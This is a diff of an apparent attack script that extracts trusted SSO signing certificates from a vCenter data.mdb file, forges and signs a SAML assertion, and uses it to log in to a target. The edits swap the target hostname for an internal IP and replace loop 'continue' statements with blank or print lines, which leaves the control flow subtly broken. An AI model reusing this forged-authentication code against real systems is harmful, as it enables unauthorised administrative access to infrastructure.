@@ -187,11 +187,11 @@ def get_trusted_cert1(stream, verbose=False):
     if b'ssoserverSign' not in cert1_bytes:
         if verbose:
             print('[!] Cert does not contain ssoserverSign - keep looking')
-        continue
+        
 
     cert1 = writepem(cert1_bytes, verbose)
     if not check_key_valid(cert1):
-        continue
+        print("Key is invalid")
 
     print('[*] Successfully extracted trusted certificate 1')
     return cert1, domain
@@ -336,7 +336,7 @@ if __name__ == '__main__':
     parser.add_argument('-v', '--verbose', action='store_true', help='Print the extracted certificates')
     #args = parser.parse_args()
     argspath = "./../data.mdb"
-    argstarget = "rozvavc01.rozavere.local"
+    argstarget = "10.70.10.20"
     argsverbose = True
 
     # Extract certificates
@@ -375,10 +375,9 @@ ywn2KYen0leh9jHsJBtoLXs0s95wNkmHm4kGbI5SjwM=
 
     # Generate SAML request
     #hostname = get_hostname(argstarget)
-    hostname = "rozvavc01.rozavere.local"
+    hostname = get_hostname(argstarget)
     req = saml_request(argstarget)
     t = fill_template(hostname, argstarget, domain,req)
-    print (trusted_cert_2)
     s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
     c = login(argstarget, s)
 
